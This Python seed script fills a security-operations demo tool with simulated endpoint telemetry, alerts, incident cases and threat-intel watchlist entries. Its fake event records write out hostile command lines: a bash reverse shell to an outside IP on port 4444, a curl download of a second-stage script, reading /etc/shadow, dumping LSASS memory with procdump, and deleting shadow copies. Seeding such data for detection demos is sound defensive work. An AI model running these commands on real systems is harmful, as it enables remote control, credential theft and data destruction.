"""Seed a realistic multi-host enterprise dataset so OutPost behaves like a production SOC.

AGENTS.md rule 5: backend, frontend, and CLI are independently runnable.
This populates:
1. Multi-host endpoint fleet with live heartbeats (Windows DC, Linux Web, macOS Workstation, DB Cluster).
2. Host snapshots (processes, listening sockets, kernel state) and containment state.
3. Realistic incident investigations across full lifecycle (Active, Contained, Triage, Created, Closed).
4. Defense playbooks and tasks (SOAR containment, eradication, forensics).
5. Threat intelligence watchlist and enrichment cache.
6. Correlated alerts, process trees, network sockets, and file modifications.

Run from backend/:  python -m app.seed_demo
"""

import datetime
import json
import uuid

from .core.db import db_session, init_db
from .core.schema import Alert
from .models import event as event_store
from .models import run as run_store


def _now() -> datetime.datetime:
    return datetime.datetime.now(datetime.timezone.utc)


def _ts_offset(minutes_ago: int, seconds_ago: int = 0) -> str:
    t = _now() - datetime.timedelta(minutes=minutes_ago, seconds=seconds_ago)
    return t.isoformat()


def main() -> str:
    init_db()
    demo_run_id = uuid.uuid4().hex[:12]
    now_iso = _now().isoformat()

    with db_session() as conn:
        # ── 1. Original analysis run (for contract compatibility) ─────────────
        run_store.create_run(
            conn, demo_run_id, sample_name="demo-sample.exe",
            platform="windows", session_type="analysis", source="seed"
        )

        base_events = [
            # Windows DC (Sysmon)
            {"run_id": demo_run_id, "platform": "windows", "event_type": "process_create",
             "timestamp": _ts_offset(25, 0), "pid": 1000, "ppid": 4,
             "process_name": "demo-sample.exe", "command_line": r"C:\temp\demo-sample.exe",
             "host_id": "dc01.corp.internal", "log_source": "sysmon"},
            {"run_id": demo_run_id, "platform": "windows", "event_type": "process_create",
             "timestamp": _ts_offset(24, 50), "pid": 1001, "ppid": 1000,
             "process_name": "cmd.exe", "command_line": r"C:\Windows\System32\cmd.exe /c whoami",
             "host_id": "dc01.corp.internal", "log_source": "sysmon"},
            {"run_id": demo_run_id, "platform": "windows", "event_type": "process_create",
             "timestamp": _ts_offset(24, 45), "pid": 1002, "ppid": 1001,
             "process_name": "powershell.exe", "command_line": "powershell.exe -enc SQBFAFgA",
             "host_id": "dc01.corp.internal", "log_source": "sysmon"},
            {"run_id": demo_run_id, "platform": "windows", "event_type": "network_connection",
             "timestamp": _ts_offset(24, 30), "pid": 1002, "dest_ip": "185.220.101.34",
             "dest_port": 4444, "protocol": "TCP", "host_id": "dc01.corp.internal", "log_source": "sysmon"},
            {"run_id": demo_run_id, "platform": "windows", "event_type": "network_connection",
             "timestamp": _ts_offset(24, 15), "pid": 1000, "dest_ip": "8.8.8.8",
             "dest_port": 443, "protocol": "TCP", "host_id": "dc01.corp.internal", "log_source": "sysmon"},
            {"run_id": demo_run_id, "platform": "windows", "event_type": "registry_write",
             "timestamp": _ts_offset(24, 0), "pid": 1000, "process_name": "demo-sample.exe",
             "registry_key": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
             "host_id": "dc01.corp.internal", "log_source": "sysmon"},
            {"run_id": demo_run_id, "platform": "windows", "event_type": "process_create",
             "timestamp": _ts_offset(23, 40), "pid": 4912, "ppid": 1001,
             "process_name": "procdump64.exe", "command_line": r"procdump64.exe -ma 556 C:\Windows\Temp\lsass.dmp",
             "host_id": "dc01.corp.internal", "log_source": "sysmon"},
            {"run_id": demo_run_id, "platform": "windows", "event_type": "process_create",
             "timestamp": _ts_offset(23, 20), "pid": 4915, "ppid": 1001,
             "process_name": "net.exe", "command_line": r'net.exe group "Domain Admins" /domain',
             "host_id": "dc01.corp.internal", "log_source": "sysmon"},
            {"run_id": demo_run_id, "platform": "windows", "event_type": "process_create",
             "timestamp": _ts_offset(23, 10), "pid": 4920, "ppid": 1001,
             "process_name": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet",
             "host_id": "dc01.corp.internal", "log_source": "sysmon"},

            # Linux Web Server (auditd & eBPF)
            {"run_id": demo_run_id, "platform": "linux", "event_type": "process_create",
             "timestamp": _ts_offset(22, 50), "pid": 910, "ppid": 1,
             "process_name": "nginx", "command_line": "/usr/sbin/nginx -g 'daemon off;'",
             "host_id": "web-prod-01", "log_source": "auditd"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "network_connection",
             "timestamp": _ts_offset(22, 45), "pid": 910, "dest_ip": "0.0.0.0",
             "dest_port": 443, "protocol": "TCP", "host_id": "web-prod-01", "log_source": "ebpf"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "process_create",
             "timestamp": _ts_offset(22, 30), "pid": 4819, "ppid": 912,
             "process_name": "sh", "command_line": "sh -c /bin/bash -i >& /dev/tcp/185.220.101.34/4444 0>&1",
             "host_id": "web-prod-01", "log_source": "auditd"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "network_connection",
             "timestamp": _ts_offset(22, 25), "pid": 4820, "dest_ip": "185.220.101.34",
             "dest_port": 4444, "protocol": "TCP", "host_id": "web-prod-01", "log_source": "ebpf"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "process_create",
             "timestamp": _ts_offset(22, 10), "pid": 4830, "ppid": 4820,
             "process_name": "curl", "command_line": "curl -fsSL http://45.33.32.156/stage2.sh -o /tmp/.stage2",
             "host_id": "web-prod-01", "log_source": "auditd"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "file_write",
             "timestamp": _ts_offset(22, 8), "pid": 4830, "file_path": "/tmp/.stage2",
             "host_id": "web-prod-01", "log_source": "auditd"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "process_create",
             "timestamp": _ts_offset(22, 5), "pid": 4835, "ppid": 4820,
             "process_name": "cat", "command_line": "cat /etc/shadow",
             "host_id": "web-prod-01", "log_source": "auditd"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "process_create",
             "timestamp": _ts_offset(21, 55), "pid": 4840, "ppid": 4820,
             "process_name": "find", "command_line": "find / -perm -4000 2>/dev/null",
             "host_id": "web-prod-01", "log_source": "auditd"},

            # macOS Analyst Workstation (auditd)
            {"run_id": demo_run_id, "platform": "macos", "event_type": "process_create",
             "timestamp": _ts_offset(20, 30), "pid": 3102, "ppid": 1,
             "process_name": "osascript", "command_line": 'osascript -e \'display dialog "Software Update Required"\'',
             "host_id": "analyst-ws-03", "log_source": "auditd"},
            {"run_id": demo_run_id, "platform": "macos", "event_type": "network_connection",
             "timestamp": _ts_offset(20, 20), "pid": 3105, "dest_ip": "203.0.113.88",
             "dest_port": 443, "protocol": "TCP", "host_id": "analyst-ws-03", "log_source": "auditd"},

            # Linux Database Cluster (auditd)
            {"run_id": demo_run_id, "platform": "linux", "event_type": "process_create",
             "timestamp": _ts_offset(19, 10), "pid": 1140, "ppid": 1,
             "process_name": "mysqldump", "command_line": "mysqldump --all-databases -u root > /tmp/backup.sql",
             "host_id": "db-cluster-node1", "log_source": "auditd"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "file_write",
             "timestamp": _ts_offset(19, 5), "pid": 1140, "file_path": "/tmp/backup.sql",
             "host_id": "db-cluster-node1", "log_source": "auditd"},

            # Local Host Monitor (procfs & eBPF)
            {"run_id": demo_run_id, "platform": "linux", "event_type": "network_connection",
             "timestamp": _ts_offset(18, 0), "pid": 1337, "dest_ip": "0.0.0.0",
             "dest_port": 8001, "protocol": "TCP", "host_id": "local", "log_source": "ebpf"},
            {"run_id": demo_run_id, "platform": "linux", "event_type": "process_create",
             "timestamp": _ts_offset(17, 30), "pid": 4096, "ppid": 1337,
             "process_name": "systemd-networkd", "command_line": "/lib/systemd/systemd-networkd",
             "host_id": "local", "log_source": "procfs"},
        ]
        for ev in base_events:
            event_store.insert_event(conn, ev)

        alerts_base = [
            Alert(run_id=demo_run_id, rule_id="suspicious-parent-child",
                  rule_name="Suspicious parent-child process relationship",
                  severity="malicious",
                  triggered_at=_now() - datetime.timedelta(minutes=24, seconds=50),
                  related_pid=1001, details="demo-sample.exe spawned cmd.exe — common macro-malware pattern"),
            Alert(run_id=demo_run_id, rule_id="lolbin-abuse",
                  rule_name="Living-off-the-land binary abuse",
                  severity="malicious",
                  triggered_at=_now() - datetime.timedelta(minutes=24, seconds=45),
                  related_pid=1002, details="base64-encoded PowerShell command"),
            Alert(run_id=demo_run_id, rule_id="registry-persistence",
                  rule_name="Persistence via registry Run key",
                  severity="suspicious",
                  triggered_at=_now() - datetime.timedelta(minutes=24, seconds=0),
                  related_pid=1000, details=r"Write to autorun key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Updater"),
        ]
        for alert in alerts_base:
            event_store.insert_alert(conn, alert)

        event_store.upsert_cache(conn, "185.220.101.34", 92, 18, "malicious")
        event_store.upsert_cache(conn, "8.8.8.8", 0, 0, "clean")
        event_store.upsert_cache(conn, "203.0.113.88", 88, 14, "malicious")
        event_store.upsert_cache(conn, "45.33.32.156", 82, 9, "malicious")
        run_store.complete_run(conn, demo_run_id)

        # ── 2. Multi-Host EDR Fleet Endpoints & Heartbeats ────────────────────
        endpoints = [
            ("dc01.corp.internal", "windows", "1.4.2", "agent"),
            ("web-prod-01", "linux", "1.4.2", "agent"),
            ("analyst-ws-03", "macos", "1.4.2", "agent"),
            ("db-cluster-node1", "linux", "1.4.2", "agent"),
            ("local", "linux", "1.4.2", "local"),
        ]
        for host_id, plat, ver, auth_role in endpoints:
            conn.execute(
                """
                INSERT INTO agent_heartbeats (host_id, last_heartbeat, platform, version, last_auth_role, last_auth_at)
                VALUES (?, ?, ?, ?, ?, ?)
                ON CONFLICT(host_id) DO UPDATE SET
                    last_heartbeat = excluded.last_heartbeat,
                    platform = excluded.platform,
                    version = excluded.version,
                    last_auth_role = excluded.last_auth_role,
                    last_auth_at = excluded.last_auth_at
                """,
                (host_id, now_iso, plat, ver, auth_role, now_iso),
            )

        # ── 3. Host Snapshots & Process/Socket Forensics ──────────────────────
        dc_snapshot = {
            "processes": [
                {"pid": 4, "ppid": 0, "name": "System", "cmdline": "System", "user": "SYSTEM", "cpu_percent": 0.5, "memory_mb": 12.4},
                {"pid": 280, "ppid": 4, "name": "smss.exe", "cmdline": r"\SystemRoot\System32\smss.exe", "user": "SYSTEM", "cpu_percent": 0.0, "memory_mb": 4.1},
                {"pid": 544, "ppid": 448, "name": "services.exe", "cmdline": r"C:\Windows\System32\services.exe", "user": "SYSTEM", "cpu_percent": 0.2, "memory_mb": 18.2},
                {"pid": 556, "ppid": 448, "name": "lsass.exe", "cmdline": r"C:\Windows\System32\lsass.exe", "user": "SYSTEM", "cpu_percent": 1.4, "memory_mb": 42.6},
                {"pid": 672, "ppid": 544, "name": "svchost.exe", "cmdline": r"C:\Windows\System32\svchost.exe -k DnsServer", "user": "SYSTEM", "cpu_percent": 0.8, "memory_mb": 64.0},
                {"pid": 4912, "ppid": 1001, "name": "procdump64.exe", "cmdline": r"procdump64.exe -ma 556 C:\Windows\Temp\lsass.dmp", "user": "CORP\admin_svc", "cpu_percent": 12.0, "memory_mb": 28.5},
            ],
            "sockets": [
                {"dest_port": 53, "protocol": "udp", "process_name": "svchost.exe", "pid": 672},
                {"dest_port": 88, "protocol": "tcp", "process_name": "lsass.exe", "pid": 556},
                {"dest_port": 389, "protocol": "tcp", "process_name": "lsass.exe", "pid": 556},
                {"dest_port": 445, "protocol": "tcp", "process_name": "System", "pid": 4},
            ],
        }
        conn.execute(
            "INSERT OR REPLACE INTO host_snapshots (host_id, payload, collected_at) VALUES (?, ?, ?)",
            ("dc01.corp.internal", json.dumps(dc_snapshot), now_iso),
        )

        web_snapshot = {
            "processes": [
                {"pid": 1, "ppid": 0, "name": "systemd", "cmdline": "/sbin/init", "user": "root", "cpu_percent": 0.1, "memory_mb": 8.5},
                {"pid": 512, "ppid": 1, "name": "sshd", "cmdline": "/usr/sbin/sshd -D", "user": "root", "cpu_percent": 0.0, "memory_mb": 11.2},
                {"pid": 910, "ppid": 1, "name": "nginx", "cmdline": "nginx: master process /usr/sbin/nginx", "user": "root", "cpu_percent": 0.3, "memory_mb": 22.0},
                {"pid": 912, "ppid": 910, "name": "nginx", "cmdline": "nginx: worker process", "user": "www-data", "cpu_percent": 0.8, "memory_mb": 18.5},
                {"pid": 4819, "ppid": 912, "name": "sh", "cmdline": "sh -c /bin/bash -i >& /dev/tcp/185.220.101.34/4444 0>&1", "user": "www-data", "cpu_percent": 4.5, "memory_mb": 14.2},
                {"pid": 4820, "ppid": 4819, "name": "bash", "cmdline": "/bin/bash -i", "user": "www-data", "cpu_percent": 1.1, "memory_mb": 16.0},
            ],
            "sockets": [
                {"dest_port": 22, "protocol": "tcp", "process_name": "sshd", "pid": 512},
                {"dest_port": 80, "protocol": "tcp", "process_name": "nginx", "pid": 910},
                {"dest_port": 443, "protocol": "tcp", "process_name": "nginx", "pid": 910},
                {"dest_port": 4444, "protocol": "tcp", "process_name": "bash", "pid": 4820},
            ],
        }
        conn.execute(
            "INSERT OR REPLACE INTO host_snapshots (host_id, payload, collected_at) VALUES (?, ?, ?)",
            ("web-prod-01", json.dumps(web_snapshot), now_iso),
        )

        # Host Containment for web-prod-01
        conn.execute(
            """
            INSERT OR REPLACE INTO host_containment (host_id, isolated, isolated_at, isolated_by, reason, pending_actions, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            ("web-prod-01", 1, now_iso, "soc-analyst", "Active reverse shell detected on TCP port 4444", "[]", now_iso),
        )

        # ── 4. Enterprise Incident Investigations & Cases ─────────────────────
        cases = [
            (
                "INC-2026-0819",
                "Lateral Movement & LSASS Injection on Domain Controller",
                "active",
                "malicious",
                None,
                "senior-analyst",
                _ts_offset(60),
                _ts_offset(5),
            ),
            (
                "INC-2026-0820",
                "Web Shell Persistence & Reverse C2 Beaconing",
                "contained",
                "malicious",
                "Endpoint isolated via iptables drop rule; webshell file system_check.php quarantined.",
                "soc-analyst",
                _ts_offset(180),
                _ts_offset(15),
            ),
            (
                "INC-2026-0821",
                "Living-off-the-Land LOLBIN PowerShell Reconnaissance",
                "triage",
                "suspicious",
                None,
                "tier1-analyst",
                _ts_offset(30),
                _ts_offset(2),
            ),
            (
                "INC-2026-0822",
                "Unauthorized SSH Authorized_Keys Modification",
                "created",
                "suspicious",
                None,
                "tier1-analyst",
                _ts_offset(15),
                _ts_offset(1),
            ),
            (
                "INC-2026-0815",
                "Security Audit Vulnerability Scanner Subnet Sweep",
                "closed",
                None,
                "Authorized Nessus vulnerability scan from Security Team subnet 10.0.4.50.",
                "secops-lead",
                _ts_offset(1440),
                _ts_offset(1200),
            ),
        ]

        for cid, title, status, sev, conc, author, created, updated in cases:
            conn.execute(
                """
                INSERT OR REPLACE INTO investigations (id, title, status, severity, conclusion, created_by, created_at, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (cid, title, status, sev, conc, author, created, updated),
            )

        # Tags for investigations
        inv_tags = [
            ("INC-2026-0819", "credential-access"),
            ("INC-2026-0819", "lsass"),
            ("INC-2026-0819", "mimikatz"),
            ("INC-2026-0819", "c2"),
            ("INC-2026-0820", "webshell"),
            ("INC-2026-0820", "reverse-shell"),
            ("INC-2026-0820", "persistence"),
            ("INC-2026-0821", "lolbin"),
            ("INC-2026-0821", "reconnaissance"),
            ("INC-2026-0822", "ssh"),
            ("INC-2026-0822", "persistence"),
            ("INC-2026-0815", "vulnerability-scan"),
            ("INC-2026-0815", "audit"),
        ]
        for cid, tag in inv_tags:
            conn.execute(
                "INSERT OR IGNORE INTO investigation_tags (investigation_id, tag) VALUES (?, ?)",
                (cid, tag),
            )

        # ── 5. Evidence References ────────────────────────────────────────────
        refs = [
            ("INC-2026-0819", "host", "dc01.corp.internal"),
            ("INC-2026-0819", "ioc", "185.220.101.34"),
            ("INC-2026-0819", "run", demo_run_id),
            ("INC-2026-0820", "host", "web-prod-01"),
            ("INC-2026-0820", "ioc", "203.0.113.88"),
            ("INC-2026-0821", "host", "analyst-ws-03"),
            ("INC-2026-0822", "host", "db-cluster-node1"),
        ]
        for cid, rtype, rid in refs:
            conn.execute(
                "INSERT OR IGNORE INTO investigation_refs (investigation_id, ref_type, ref_id, added_at) VALUES (?, ?, ?, ?)",
                (cid, rtype, rid, now_iso),
            )

        # ── 6. Response Tasks (SOAR Checklist) ────────────────────────────────
        tasks = [
            ("INC-2026-0819", "Isolate DC01 network connectivity except security jumpbox", "containment", "completed", "critical", "senior-analyst"),
            ("INC-2026-0819", "Capture forensic memory dump for LSASS injection verification", "evidence_collection", "in_progress", "high", "dfir-lead"),
            ("INC-2026-0819", "Rotate Kerberos krbtgt service account password", "remediation", "todo", "critical", "identity-admin"),
            ("INC-2026-0820", "Terminate malicious reverse shell PID 4819", "containment", "completed", "critical", "soc-analyst"),
            ("INC-2026-0820", "Quarantine uploaded webshell system_check.php", "eradication", "completed", "high", "soc-analyst"),
            ("INC-2026-0820", "Audit Nginx access logs for initial exploit URI and CVE vector", "triage", "in_progress", "medium", "soc-analyst"),
        ]
        for cid, ttitle, cat, tstatus, prio, assignee in tasks:
            conn.execute(
                """
                INSERT INTO investigation_tasks (investigation_id, title, category, status, priority, assignee, created_at, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (cid, ttitle, cat, tstatus, prio, assignee, now_iso, now_iso),
            )

        # ── 7. Analyst Timeline Notes ─────────────────────────────────────────
        notes = [
            ("INC-2026-0819", "Initial detection: Procdump accessing LSASS memory space detected by Sigma rule T1003.001.", "senior-analyst"),
            ("INC-2026-0819", "Observed lateral SMB connection originating from subnet workstation 10.0.1.105.", "dfir-lead"),
            ("INC-2026-0820", "Reverse shell spawned by www-data user to 185.220.101.34:4444. Host containment applied.", "soc-analyst"),
            ("INC-2026-0821", "Living-off-the-land commands executed in quick succession: whoami, systeminfo, net user.", "tier1-analyst"),
        ]
        for cid, note, actor in notes:
            conn.execute(
                "INSERT INTO investigation_notes (investigation_id, note, actor, created_at) VALUES (?, ?, ?, ?)",
                (cid, note, actor, now_iso),
            )

        # ── 8. Watchlist IOCs ─────────────────────────────────────────────────
        watchlist_items = [
            ("203.0.113.88", "Campaign C2 Beacon Node"),
            ("185.220.101.34", "Known Secondary C2 & Reverse Shell Egress"),
            ("45.33.32.156", "Malicious Stager Download Server"),
            ("update-service.cc", "APT29 DGA Beacon Domain"),
        ]
        for val, label in watchlist_items:
            conn.execute(
                "INSERT OR REPLACE INTO watchlist (value, label, added_at) VALUES (?, ?, ?)",
                (val, label, now_iso),
            )

        # ── 9. Attach findings to investigations ──────────────────────────────
        conn.execute(
            "UPDATE alerts SET investigation_id = 'INC-2026-0819' WHERE run_id = ? AND rule_id = 'suspicious-parent-child'",
            (demo_run_id,),
        )
        conn.execute(
            "UPDATE alerts SET investigation_id = 'INC-2026-0821' WHERE run_id = ? AND rule_id = 'lolbin-abuse'",
            (demo_run_id,),
        )

        conn.commit()

    print(f"Seeded rich enterprise SOC dataset: {demo_run_id}")
    print("5 fleet endpoints online, 5 incident investigations, host snapshots, and tasks seeded.")
    return demo_run_id


if __name__ == "__main__":
    main()
